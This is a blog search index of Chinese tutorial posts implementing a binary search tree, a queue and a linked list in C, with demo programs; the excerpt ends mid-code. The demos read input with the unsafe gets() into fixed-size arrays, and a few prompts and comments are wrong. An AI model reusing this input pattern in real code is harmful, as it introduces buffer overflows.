<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[抽象数据类型（ADT）---二叉搜索树]]></title>
    <url>%2F2020%2F04%2F11%2F%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88ADT%EF%BC%89-%E4%BA%8C%E5%8F%89%E6%A0%91%2F</url>
    <content type="text"><![CDATA[二叉查找树（Binary Search Tree），（又：二叉搜索树，二叉排序树）它或者是一棵空树，或者是具有下列性质的二叉树： 若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉排序树。二叉搜索树作为一种经典的数据结构，它既有链表的快速插入与删除操作的特点，又有数组快速查找的优势；所以应用十分广泛，例如在文件系统和数据库系统一般会采用这种数据结构进行高效率的排序与检索操作。 二叉树ADT&emsp;&emsp;从定义二叉树的常规内容开始，该定义假设树中不包含相同的项目，很多操作与列表操作相同。不同之处在于数据的层次性安排。 二叉搜索树是能够高效地进行如下操作的数据结构。1.插入一个数值2.查询是否包含某个数值3.删除某个数值 下面是有关此ADT的非正式总结 类型名称 二叉搜索树 类型属性： 二叉树或者是一个空的节点集合（空树），或者是一个指定某一节点为根的节点集合 每个节点有两个作为其后代的树，称为左子树和右子树 每一个子树本身又是一个二叉树，也包含它是个空树的可能性 二叉搜索树是有序的二叉树，它的每个节点也包含一个项目，它的左子树的项目排在根项目的前面，而跟项目在所有右子树项目的前面 类型操作: 把树初始化为空树 确定树是否为空 确定树是否已满 确定树中项目的个数 向树中添加一个项目 向树中删除一个项目 在树中搜索一个项目 访问树中一个项目 清空树 二叉搜索树的接口1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* tree.h -- 二叉搜索树 *//* 树中不允许有相同的项目 */#ifndef _TREE_H_#define _TREE_H_#include &lt;stdio.h&gt;#include &lt;stdbool.h&gt;typedef struct item // 可自定义项目结构&#123; char petname[20]; char petkind[20];&#125; Item;typedef struct node&#123; Item item; struct node * left; // 指向左分支的指针 struct node * right; // 指向右分支的指针&#125; Node;typedef struct tree&#123; Node * root; // 指向树根的指针 int size; // 树中项目个数&#125; Tree;#define MAXITEMS 10// 初始化生成树void InitializeTree(Tree * ptree);// 判断树是否为空bool TreeIsEmpty(const Tree * ptree);// 判断树是否满bool TreeIsFull(const Tree * ptree);// 确定树中的项目个数int TreeItemCount(const Tree * ptree);// 向树中添加一个项目bool AddItem(const Item * pi, Tree * ptree);// 向树中查找一个项目bool InTree(const Item * pi, const Tree * ptree);// 向树中删除一个项目bool DeleteItem(const Item * pi, Tree * ptree);// 通过函数作用于树中的每一个项目void Traverse(const Tree * ptree, void (* pfun)(Item item));// 删除所有节点void DeleteAll(Tree * ptree);#endif 二叉搜索树的实现添加项目步骤 判断树是否已满，添加的项目重复 创建新节点 若根节点为NULL，则新节点为根节点，否则调用AddNode()函数添加节点步骤(AddNode) 判断添加的节点项目大于(小于)当前根节点 判断左（右）子树为空 若左（右）子树为空，添加新节点，否则递归调用AddNode，即回到第一步删除项目步骤 调用SeekItem查找要删除的目标函数，返回一个结构体地址（包含目标项目的节点和其根节点） 如果返回的节点为空，说明未找到目标项目。 判断其节点位置（左/右子树或根），调用 DeleteNode() 项目减一删除节点步骤(DeleteNode) 创建一个临时节点 若目标节点的左（右）节点为空/无节点，保存节点信息，右（左）节点取代父节点位置，释放节点 若目标节点的含有两个节点，循环，沿着左子树的最右分支查找空位置 把目标节点的右子树放到(依附)目标节点左子树的右分支空位置 左子树取代目标节点位置，释放目标节点 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272/* tree.c -- 树类型的支持函数 */#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include "tree.h"// 局部数据类型typedef struct pair &#123; Node * parent; Node * child;&#125; Pair;// 局部函数的原型static Node * MakeNode(const Item * pi);static bool ToLeft(const Item * i1, const Item * i2);static bool ToRight(const Item * i1, const Item * i2);static void AddNode(Node * new_node, Node * root);static void InOrder(const Node * root, void (* pfun)(Item item));static Pair SeekItem(const Item * pi, const Tree * ptree);static void DeleteNode(Node **ptr);static void DeleteAllNodes(Node * ptr);// 函数定义// 初始化生成树void InitializeTree(Tree * ptree)&#123; ptree-&gt;root = NULL; ptree-&gt;size = 0;&#125;// 判断树是否为空bool TreeIsEmpty(const Tree * ptree)&#123; if(ptree-&gt;root == NULL) return true; else return false;&#125;// 判断树是否满bool TreeIsFull(const Tree * ptree)&#123; if(ptree-&gt;size == MAXITEMS) return true; else return false;&#125;// 确定树中的项目个数int TreeItemCount(const Tree * ptree)&#123; return ptree-&gt;size;&#125;// 向树中添加一个项目bool AddItem(const Item * pi, Tree * ptree)&#123; Node * new_node; if(TreeIsFull(ptree)) // 树是否满了 &#123; fprintf(stderr, "Tree is full\n"); return false; &#125; if(SeekItem(pi, ptree).child != NULL) // 判断项目是否重复 &#123; fprintf(stderr, "Attempted to add duplicate item\n"); return false; &#125; new_node = MakeNode(pi); // 创建新节点 if(new_node == NULL) &#123; fprintf(stderr, "Could't creat node\n"); return false; &#125; ptree-&gt;size++; // 创建成功，size+1 if(ptree-&gt;root == NULL) // 树为空，新节点作为根节点 ptree-&gt;root = new_node; else // 树不为空，新节点加入数中 AddNode(new_node, ptree-&gt;root); return true;&#125;// 向树中查找一个项目bool InTree(const Item * pi, const Tree * ptree)&#123; return (SeekItem(pi, ptree).child == NULL) ? false : true;&#125;// 向树中删除一个项目bool DeleteItem(const Item * pi, Tree * ptree)&#123; Pair look; look = SeekItem(pi, ptree); //查找，返回含两个指针的结构体 if(look.child == NULL) // look.child为空，说明没有找到要删除的项目 return false; // look.child 为目标节点 if(look.parent == NULL) // look.parent为空 说明目标节点是根节点 DeleteNode(&amp;ptree-&gt;root); else if(look.parent-&gt;left == look.child) DeleteNode(&amp;look.parent-&gt;left); else DeleteNode(&amp;look.parent-&gt;right); ptree-&gt;size--; return true;&#125;// 通过函数作用于树中的每一个节点的项目void Traverse(const Tree * ptree, void (* pfun)(Item item))&#123; if(ptree != NULL) InOrder(ptree-&gt;root, pfun);&#125;// 删除所有节点void DeleteAll(Tree * ptree)&#123; if(ptree != NULL) DeleteAllNodes(ptree-&gt;root); ptree-&gt;root = NULL; ptree-&gt;size = 0;&#125;// 局部函数的实现// 创建一个新的节点，并返回新节点地址 static Node * MakeNode(const Item * pi)&#123; Node * new_node; new_node = (Node *)malloc(sizeof(Node)); if(new_node != NULL) &#123; new_node-&gt;item = *pi; // 项目复制 new_node-&gt;left = NULL; new_node-&gt;right = NULL; &#125; return new_node;&#125;// 判断目标项目在左分支树， 相当于 "&lt;"static bool ToLeft(const Item * i1, const Item * i2)&#123; int comp1; if((comp1 = strcmp(i1-&gt;petname, i2-&gt;petname)) &lt; 0) return true; else if(comp1 == 0 &amp;&amp; strcmp(i1-&gt;petkind, i2-&gt;petkind) &lt; 0) return true; else return false;&#125;// 判断目标项目在右分支树， 相当于 "&gt;"static bool ToRight(const Item * i1, const Item * i2)&#123; int comp1; if((comp1 = strcmp(i1-&gt;petname, i2-&gt;petname)) &gt; 0) return true; else if(comp1 == 0 &amp;&amp; strcmp(i1-&gt;petkind, i2-&gt;petkind) &gt; 0) return true; else return false;&#125;// 添加节点static void AddNode(Node * new_node, Node * root)&#123; if(ToLeft(&amp;new_node-&gt;item, &amp;root-&gt;item)) // 添加的节点项目大于当前根节点 &#123; if(root-&gt;left == NULL) // 空子树或左子树为空 root-&gt;left = new_node; // 添加节点到左子树 else AddNode(new_node, root-&gt;left); // 节点不为空，递归 &#125; else if(ToRight(&amp;new_node-&gt;item, &amp;root-&gt;item)) // 添加的节点项目小于当前根节点 &#123; if(root-&gt;right == NULL) // 右子树为空 root-&gt;right = new_node; // 添加节点到右子树 else AddNode(new_node, root-&gt;right); // 节点不为空，递归 &#125; else // 新节点项目相同 &#123; fprintf(stderr, "location error in AddNode() \n"); exit(EXIT_FAILURE); &#125;&#125;// 递归遍历二叉树static void InOrder(const Node * root, void (* pfun)(Item item))&#123; if(root != NULL) &#123; InOrder(root-&gt;left, pfun); (*pfun)(root-&gt;item); InOrder(root-&gt;right, pfun); &#125;&#125;static Pair SeekItem(const Item * pi, const Tree * ptree)&#123; Pair look; look.parent = NULL; look.child = ptree-&gt;root; if(look.child == NULL) // 根节点为空 return look; while(look.child != NULL) &#123; if(ToLeft(pi, &amp;(look.child-&gt;item))) // 目标在左分支 &#123; look.parent = look.child; look.child = look.child-&gt;left; &#125; else if(ToRight(pi, &amp;(look.child-&gt;item))) // 目标在左分支 &#123; look.parent = look.child; look.child = look.child-&gt;right; &#125; else // 前面两种都不是，就是相等的情况 break; //look.child是目标节点的地址 &#125; return look;&#125;static void DeleteNode(Node **ptr)&#123; // ptr是指向目标节点的父节点指针成员的地址 Node * temp; // *ptr == temp puts((*ptr)-&gt;item.petname); if((*ptr)-&gt;left == NULL) // 目标节点的左节点为空/无节点 &#123; temp = *ptr; *ptr = (*ptr)-&gt;right; // 右节点取代父节点位置 free(temp); &#125; else if((*ptr)-&gt;right == NULL) // 目标节点的右节点为空 &#123; temp = *ptr; *ptr = (*ptr)-&gt;left; // 左节点取代父节点位置 free(temp); &#125; else // 目标节点的含有两个节点 &#123; // 循环，沿着左子树的最右分支查找空位置 for (temp = (*ptr)-&gt;left; temp-&gt;right != NULL; temp = temp-&gt;right) continue; temp-&gt;right = (*ptr)-&gt;right; // 把目标节点的右子树放到(依附)目标节点左子树的右分支空位置 temp = *ptr; *ptr = (*ptr)-&gt;left; // 左子树取代目标节点位置 free(temp); // 释放目标节点 &#125;&#125;// 删除所有节点static void DeleteAllNodes(Node * root)&#123; Node * pright; if(root !=NULL) &#123; pright = root-&gt;right; DeleteAllNodes(root-&gt;left); free(root); DeleteAllNodes(pright); &#125;&#125; 二叉搜索树的应用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147/* petclub.c -- 使用二叉树 */#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;#include "tree.h"char menu(void);void addpet(Tree * pt);void droppet(Tree * pt);void showpets(const Tree * pt);void findpets(const Tree * pt);void printitem(Item item);void uppercase(char * str);int main(void)&#123; Tree pets; char choice; InitializeTree(&amp;pets); while((choice = menu()) != 'q') &#123; switch (choice) &#123; case 'a': addpet(&amp;pets); break; case 'l': showpets(&amp;pets); break; case 'f': findpets(&amp;pets); break; case 'n': printf("%d pets in club\n", TreeItemCount(&amp;pets)); break; case 'd': droppet(&amp;pets); break; default: puts("Switching error"); &#125; &#125; DeleteAll(&amp;pets); puts("Bye."); return 0;&#125;char menu(void)&#123; int ch; puts("Nerfville Pet Club Membership Program"); puts("Enter the letter coresponding your choice: "); puts("a) add a pet l) show list of pets"); puts("n) number of pet f) find pets"); puts("d)delete a pet q) quit"); while((ch = getchar()) != EOF) &#123; while(getchar() != '\n') /* 清空缓冲 */ continue; ch = tolower(ch); if(strchr("alrfndq", ch) == NULL) puts("Please enter an a, l, f, n, d, or q"); else break; &#125; if(ch == EOF) // 令EOF导致程序退出 ch = 'q'; return ch;&#125;void addpet(Tree * pt)&#123; Item temp; if(TreeIsFull(pt)) puts("No room in the club!"); else &#123; puts("Please enter name of pets: "); gets(temp.petname); puts("Please enter pet kind: "); gets(temp.petkind); uppercase(temp.petname); uppercase(temp.petkind); AddItem(&amp;temp, pt); &#125;&#125;void droppet(Tree * pt)&#123; Item temp; if(TreeIsEmpty(pt)) &#123; puts("No entries!"); return; &#125; puts("Please enter name of pet you wish to delete: "); gets(temp.petname); puts("Please enter pet kind: "); gets(temp.petkind); printf("%s the %s ", temp.petname, temp.petkind); if(DeleteItem(&amp;temp, pt)) printf("is dropped from the club.\n"); else printf("is not a member.\n");&#125;void showpets(const Tree * pt)&#123; if(TreeIsEmpty(pt)) puts("No entries!"); else Traverse(pt, printitem);&#125;void findpets(const Tree * pt)&#123; Item temp; if(TreeIsEmpty(pt)) &#123; puts("No entries!"); return; &#125; puts("Please enter name of pet you wish to delete: "); gets(temp.petname); puts("Please enter pet kind: "); gets(temp.petkind); uppercase(temp.petname); uppercase(temp.petkind); printf("%s the %s ", temp.petname, temp.petkind); if(InTree(&amp;temp, pt)) printf("is a member.\n"); else printf("is not a member.\n");&#125;void printitem(Item item)&#123; printf("Pet: %-19s Kind: %-19s\n", item.petname, item.petkind);&#125;void uppercase(char * str)&#123; while(*str) &#123; *str = toupper(*str); str++; &#125;&#125;]]></content>
      <categories>
        <category>-C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[抽象数据类型（ADT）---队列]]></title>
    <url>%2F2020%2F04%2F09%2F%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88ADT%EF%BC%89-%E9%98%9F%E5%88%97%2F</url>
    <content type="text"><![CDATA[队列是一种特殊的线性表，特殊之处在于它只允许在表的前端（front）进行删除操作，而在表的后端（rear）进行插入操作，和栈一样，队列是一种操作受限制的线性表。进行插入操作的端称为队尾，进行删除操作的端称为队头。 简介&emsp;&emsp;队列(queue)是具有特殊属性的列表。第一，新的项目只能被添加到列表结尾处；第二，项目只能从列表开始处被移除。可以将队列看成一群人排队买票，您在队尾加入，买完票从队首离开。队列是一种“先进先出（First in, First out）”的数据形式。 类型名称 队列 类型属性： 可保存一个项目序列 类型操作： 把队列初始化为空列队列 确定队列是否为空 确定队列是否已满 确定队列中项目的个数 向列表末尾添加项目 遍历队列中的每个项目 从队列首端删除和恢复项目 清空队列 定义接口12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* queue.h -- 队列接口 */#pragma c9x on // 启用C99的特性#ifndef _QUEUE_H // 防止重复导入#define _QUEUE_H#include &lt;stdbool.h&gt;// 插入 Item 定义typedef int Item; // 这里的Item表示一个整数值#define MAXQUEUE 10 // 队列最大项目数typedef struct node // 节点 包含item，以及下一个节点的位置信息&#123; Item item; struct node * next;&#125; Node;typedef struct queue // 记录队列的头，尾，个数&#123; Node * front; // 队首 Node * rear; // 队尾 int items;&#125; Queue;/* 初始化队列 */void InitializeQueue(Queue * pq);/* 判断队列是否已满 */bool QueueIsFull(const Queue * pq);/* 判断队列是否为空 */bool QueueIsEmpty(const Queue * pq);/* 返回项目个数 */int QueueItemCount(const Queue * pq);/* 队列添加项目 */bool EnQueue(Item item, Queue * pq);/* 队列删除项目 */bool DeQueue(Item * pitem, Queue * pq);/* 清空队列 */void EmptyTheQueue(Queue * pq);#endif 实现接口添加项目向队列中添加项目步骤： 创建新的节点 把项目复制到新节点 设置节点的next指针为NULL,表明该节点是列表中最后一个节点 设置当前尾节点的next指针指向新节点，从而将新节点链接到队列中。 把rear指针设置为指向新节点，以便找到最后的节点。 项目个数加一。 CopyToItem作为静态函数把项目复制到一个节点中 1static void CopyToNode(Item item, Node * pn) 此外函数还需考虑两种情况。首先，队列为空，那么front就指向新节点。此时，新节点既是队首也是队尾。其次，如果新节点分配空间失败，需要执行一些操作。因此，代码如下： 1234567891011121314151617181920212223/* 队列添加项目 */bool EnQueue(Item item, Queue * pq)&#123; Node * pnew; // 创建新的节点 if(QueueIsFull(pq)) // 判断队列是否为空 return false; pnew = (Node *)malloc(sizeof(Node)); // 为新节点分配空间 if(pnew == NULL) &#123; fprintf(stderr, "Unable to allocate memory!"); exit(EXIT_FAILURE); &#125; CopyToNode(item, pnew); // 把项目复制到新节点上 pnew-&gt;next = NULL; // 新节点next置为空 if(QueueIsEmpty(pq)) pq-&gt;front = pnew; // 队列为空，新节点就作为队首 else pq-&gt;rear-&gt;next = pnew; // 当前队尾的next指向新节点 pq-&gt;rear = pnew; // 记录新节点为队尾 pq-&gt;items++; // 项目+1 return true;&#125; 删除项目从队列首端删除项目包括下列步骤： 把项目复制到一个给定变量中。 释放空闲节点使用的内存 重置首指针，使其指向队列中的下一项。 如果最后一项被删除，把首位均重置为NULL. 项目数减一。 CopyToItem()把一个节点项目复制到一个Item变量 1static void CopyToItem(Node * pn, Item * pi) 12345678910111213141516/* 队列删除项目 */bool DeQueue(Item * pitem, Queue * pq)&#123; Node * pt; // 声明一个临时节点存放删除的队列首项 if(QueueIsEmpty(pq)) // 判断队列是否为空 return false; CopyToItem(pq-&gt;front, pitem); // 把队首的项目复制到pitem pt = pq-&gt;front; // 存放队首地址 pq-&gt;front = pq-&gt;front-&gt;next; // 更新当前队列的头 free(pt); // 释放删除的队首 pq-&gt;items--; // 项目-1 if(pq-&gt;items == 0) // 最后一项删除后，rear置为空 pq-&gt;rear = NULL; return true;&#125; 这里需要注意的是，虽然没有front指针没有置为null，但其实在删除最后一项时，已经把front指针设置为被删除节点的next指针，因为最后一项节点的next为空，所以front也会置为空。 完整代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394/* 队列类型的实现 */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include "queue.h"// 局部函数static void CopyToNode(Item item, Node * pn);static void CopyToItem(Node * pn, Item * pi);/* 初始化队列 */void InitializeQueue(Queue * pq)&#123; pq-&gt;front = pq-&gt;rear = NULL; //头尾置为空 pq-&gt;items = 0; // 项目数量为0&#125;/* 判断队列是否已满 true/false */bool QueueIsFull(const Queue * pq)&#123; return pq-&gt;items == MAXQUEUE;&#125;/* 判断队列是否为空 */bool QueueIsEmpty(const Queue * pq)&#123; return pq-&gt;items == 0;&#125;/* 返回项目个数 */int QueueItemCount(const Queue * pq)&#123; return pq-&gt;items;&#125;/* 队列添加项目 */bool EnQueue(Item item, Queue * pq)&#123; Node * pnew; if(QueueIsFull(pq)) return false; pnew = (Node *)malloc(sizeof(Node)); if(pnew == NULL) &#123; fprintf(stderr, "Unable to allocate memory!"); exit(EXIT_FAILURE); &#125; CopyToNode(item, pnew); // 把项目复制到新节点上 pnew-&gt;next = NULL; if(QueueIsEmpty(pq)) pq-&gt;front = pnew; // 队列为空，新节点就作为队首 else pq-&gt;rear-&gt;next = pnew; // 当前队尾的next指向新节点 pq-&gt;rear = pnew; // 记录新节点为队尾 pq-&gt;items++; return true;&#125;/* 队列删除项目 */bool DeQueue(Item * pitem, Queue * pq)&#123; Node * pt; if(QueueIsEmpty(pq)) return false; CopyToItem(pq-&gt;front, pitem); // 把队首的项目复制到pitem pt = pq-&gt;front; pq-&gt;front = pq-&gt;front-&gt;next; // 更新当前队列的头 free(pt); pq-&gt;items--; if(pq-&gt;items == 0) pq-&gt;rear = NULL; return true;&#125;/* 清空队列 */void EmptyTheQueue(Queue * pq)&#123; Item dummy; while(!QueueIsEmpty(pq)) DeQueue(&amp;dummy, pq);&#125;/* 局部函数 */static void CopyToNode(Item item, Node * pn)&#123; pn-&gt;item = item;&#125;static void CopyToItem(Node * pn, Item * pi)&#123; *pi = pn-&gt;item;&#125; 使用接口1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* use_q.c -- 测试Queue的接口驱动程序 *//* cpmile with Queue */#include &lt;stdio.h&gt;#include "queue.h"int main(void)&#123; Queue line; Item temp; char ch; InitializeQueue(&amp;line); puts("Testing the Queue interface. Type a to add a value, "); puts("type d to delete a value, and type q to quit"); while((ch = getchar()) != 'q') &#123; if(ch != 'a' &amp;&amp; ch != 'd') continue; if(ch == 'a') &#123; printf("Integer to add: "); scanf("%d", &amp;temp); if(!QueueIsFull(&amp;line)) &#123; printf("Putting %d into queue\n", temp); EnQueue(temp, &amp;line); &#125; else puts("Queue is full!"); &#125; else &#123; if(QueueIsEmpty(&amp;line)) puts("Nothing to delete!"); else &#123; DeQueue(&amp;temp, &amp;line); printf("Removing %d from queue\n", temp); &#125; &#125; printf("%d items in queue\n", QueueItemCount(&amp;line)); puts("Type a to add, d to delete, q to quit: "); &#125; EmptyTheQueue(&amp;line); puts("Bye!"); return 0;&#125; 程序运行： 12345678910111213141516171819202122232425262728293031Testing the Queue interface. Type a to add a value,type d to delete a value, and type q to quitaInteger to add: 40Putting 40 into queue1 items in queueType a to add, d to delete, q to quit:aInteger to add: 55Putting 55 into queue2 items in queueType a to add, d to delete, q to quit:aInteger to add: 24Putting 24 into queue3 items in queueType a to add, d to delete, q to quit:dRemoving 40 from queue2 items in queueType a to add, d to delete, q to quit:dRemoving 55 from queue1 items in queueType a to add, d to delete, q to quit:dRemoving 24 from queue0 items in queueType a to add, d to delete, q to quit:qBye!]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[抽象数据类型(ADT)---链表]]></title>
    <url>%2F2020%2F04%2F08%2F%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%EF%BC%88ADT%EF%BC%89-%E9%93%BE%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[抽象数据类型（Abstract Data Type，ADT）是计算机科学中具有类似行为的特定类别的数据结构的数学模型；或者具有类似语义的一种或多种程序设计语言的数据类型。抽象数据类型是描述数据结构的一种理论工具，其目的是使人们能够独立于程序的实现细节来理解数据结构的特性。抽象数据类型的定义取决于它的一组逻辑特性，而与计算机内部如何表示无关。 简介&emsp;&emsp;类型由什么组成？一个类型指定两类信息：一个属性集和一个操作集。比如，int类型的属性表示它是一个整数值，因为它是一个整数值，因此它拥有整数的属性。它允许的算数操作是改变一个int树的符号，两数相加减，两数相乘除等。又比如说，定义一个“学生”类型，姓名，性别，成绩都是它的属性集，而添加学生，删除学生就是操作集。&emsp;&emsp;那么如何创建一个新的类型呢？分3个步骤从抽象到具体的过程： 为类型的属性和可对类型的操作提供一个抽象的描述。 开发一个实现该ADT的编程接口。即说明如何存储数据并描述用于执行所需操作的函数集合。 编写代码来实现这个接口。 接下来以ADT的风格实现链表 链表&emsp;&emsp;链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域。 相比于线性表顺序结构，操作复杂。由于不必须按顺序存储，链表在插入的时候可以达到O(1)的复杂度，比另一种线性表顺序表快得多，但是查找一个节点或者访问特定编号的节点则需要O(n)的时间，而线性表和顺序表相应的时间复杂度分别是O(logn)和O(1)。 &emsp;&emsp;为了使例子简单，用列表的形式描述抽象数据类型 类型名称 简单列表 类型属性： 可保存一个项目序列 类型操作： 把列表初始化为空列表 确定列表是否为空 确定列表是否已满 确定列表中项目的个数 向列表末尾添加项目 遍历列表中的每个项目 清空列表 定义接口&emsp;&emsp;简单列表的接口有两部分。第一部分是描述数据如何表示，第二部分描述实现ADT操作的函数。C语言把所有类型和函数信息集成一个包中的方法是将类型定义和函数原型放入一个头文件中。这个文件将提供程序员使用该类型所需的全部信息。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/* list.h 简单列表类型的头文件 */#ifndef LIST_H_#define LIST_H_#include &lt;stdbool.h&gt; /* C99特性*//* 特定于程序的声明 */#define TSIZE 45 /* 存放片名的数组大小 */struct film&#123; char title[TSIZE]; int rating;&#125;;/* 一般类型定义 */typedef struct film Item;typedef struct node&#123; Item item; // 项目 struct node * next; // 存放下一个节点的地址&#125; Node;typedef Node * List; // List 就是 Node */* 函数原型*//* 操作： 初始化一个列表 *//* 操作前： plist指向一个列表 *//* 操作后： 该列表被初始化为一个空表 */void InitializeList(List * plist); /* 操作： 确定列表是否为空 *//* 操作前： plist指向一个已初始化列表 *//* 操作后： 列表为空返回true， 反之，false */bool ListIsEmpty(List * plist);/* 操作： 确定列表是否已满 *//* 操作前： plist指向一个已初始化列表 *//* 操作后： 列表已满返回true， 反之，false */bool ListIsFull(List * plist);/* 操作： 确定列表中的项目个数 *//* 操作前： plist指向一个已初始化列表 *//* 操作后： 返回该列表中的项目个数 */unsigned int ListItemCount(const List * plist);/* 操作： 在列表尾部添加一个项目 *//* 操作前： item是一个要被添加的项目，plist指向一个已初始化列表 *//* 操作后： 操作成功返回true， 失败返回false */bool AddItem(Item item, List * plist);/* 操作： 把一个函数作用于列表的每个项目 *//* 操作前： plist指向一个已初始化列表，pfun指向一个函数，该函数接收一个Item项目 *//* 操作后： 指向的函数作用于每个项目 */void Traverse(const List * plist, void (* pfun)(Item item));/* 操作： 释放已分配的内存（如果有）*//* 操作前： plist指向一个已初始化列表 *//* 操作后： 内存释放，列表被置为空表 */void EmptyTheList(List * plist);#endif 实现接口需要实现的函数： 初始化InitializeList()将列表初始化为空列表。只需将传入的List指针置为NULL; 判断链表是否为空ListIsEmpty()函数实现简单，只要判断指针是否为NULL，正确返回true，反之false; 判断链表是否已满ListIsFull()可以通过malloc()函数尝试给一个新项目分配内存，如果分配失败，说明链表已满。 确定列表中的项目个数ListItemCount()函数使用常用的链表算法遍历链表，同时统计个数。通过while循环，只要节点为空，说明遍历到链表末尾 123456789101112unsigned int ListItemCount(const List * plist)&#123; unsigned int count = 0; Node * pnode = *plist; // 设置列表的开始处 while(pnode != NULL) &#123; ++count; pnode = pnode-&gt;next; /* 设置下一个节点 */ &#125; return count;&#125; 在列表尾部添加一个项目AddItem()函数是在这些函数中，做的最多的 尝试为新节点分配空间; 通过CopyToNode()把项目复制到新的节点，并把新节点的next置为null; 如果列表为空，新节点作为头节点 列表不为空，通过while循环，找到链表结尾，将新节点添加到结尾 CopyToNode()把项目复制到新的节点的项目中，它是实现的一部分但不是接口的一部分，通过tatic存储类限定词将其隐藏在listc文件中。 123456789101112131415161718192021bool AddItem(Item item, List * plist)&#123; Node * pnew; Node * scan = *plist; pnew = (Node *)malloc(sizeof(Node)); if(pnew == NULL) return false; CopyToNode(item, pnew); // 把传入的item结构赋值到新节点的item中 pnew-&gt;next = NULL; // 指向空指针 if(scan == NULL) *plist = pnew; else &#123; while(scan-&gt;next != NULL) scan = scan-&gt;next; // 找到列表结尾 scan-&gt;next = pnew; // 新节点加到结尾 &#125; return true;&#125; 项目操作Traverse()把一个函数作用于列表的每个项目 123456789void Traverse(const List * plist, void (* pfun)(Item item))&#123; Node * pnode = * plist; while(pnode != NULL) // 遍历项目 &#123; (*pfun)(pnode-&gt;item); // 调用函数 pnode = pnode-&gt;next; &#125;&#125; 清空列表EmptyTheList()是清空列表，记得在释放节点前，保存以一个节点的地址 完整代码实现的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697/* list.c*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdbool.h&gt;#include "list.h" // 局部函数原型static void CopyToNode(Item item, Node * pnode);void InitializeList(List * plist)&#123; * plist = NULL;&#125;bool ListIsEmpty(List * plist)&#123; if (* plist == NULL) return true; else return false;&#125;bool ListIsFull(List * plist)&#123; Node * pt; bool full; pt = (Node *)malloc(sizeof(Node)); if (pt == NULL) // 分配失败，返回false full = true; else full = false; free(pt); // 将分配的内存释放 return full;&#125;unsigned int ListItemCount(const List * plist)&#123; unsigned int count = 0; Node * pnode = *plist; // 设置列表的开始处 while(pnode != NULL) &#123; ++count; pnode = pnode-&gt;next; /* 设置下一个节点 */ &#125; return count;&#125;bool AddItem(Item item, List * plist)&#123; Node * pnew; Node * scan = *plist; pnew = (Node *)malloc(sizeof(Node)); if(pnew == NULL) return false; CopyToNode(item, pnew); // 把传入的item结构赋值到新节点的item中 pnew-&gt;next = NULL; // 指向空指针 if(scan == NULL) *plist = pnew; else &#123; while(scan-&gt;next != NULL) scan = scan-&gt;next; // 找到列表结尾 scan-&gt;next = pnew; // 新节点加到结尾 &#125; return true;&#125;void Traverse(const List * plist, void (* pfun)(Item item))&#123; Node * pnode = * plist; while(pnode != NULL) &#123; (*pfun)(pnode-&gt;item); // 调用函数 pnode = pnode-&gt;next; &#125;&#125;void EmptyTheList(List * plist)&#123; Node *psave; while(*plist != NULL) &#123; psave = (*plist)-&gt;next; // 保存下一个节点地址 free(*plist); *plist = psave; //前进到下一个节点 &#125;&#125;// 局部函数定义static void CopyToNode(Item item, Node * pnode)&#123; pnode-&gt;item = item; // 结构复制&#125; 使用接口&emsp;&emsp;我们在使用这个接口编写程序不必知道太多的细节。比如不用知道函数是如何编写的。这里我们编写一个存储电影影片的程序。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/* firms.c -- 使用ADT风格的链表 *//* 和listc 一同编译*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; /* exit()原型 */#include "list.h" /* 定义List， Item */void showmovies(Item item);int main(void)&#123; List movies; Item temp; //初始化 InitializeList(&amp;movies); if (ListIsFull(&amp;movies)) &#123; fprintf(stderr, "No memory available! Bye!\n"); exit(1); &#125; // 收集并存储 puts("Enter first movie title: "); while(gets(temp.title) != NULL &amp;&amp; temp.title[0] != '\0') &#123; puts("Enter your rating &lt;0-10&gt;"); scanf("%d", &amp;temp.rating); while(getchar() != '\n') continue; if (AddItem(temp, &amp;movies) == false) &#123; fprintf(stderr, "Problem allocating memory"); break; &#125; if (ListIsFull(&amp;movies)) &#123; puts("The 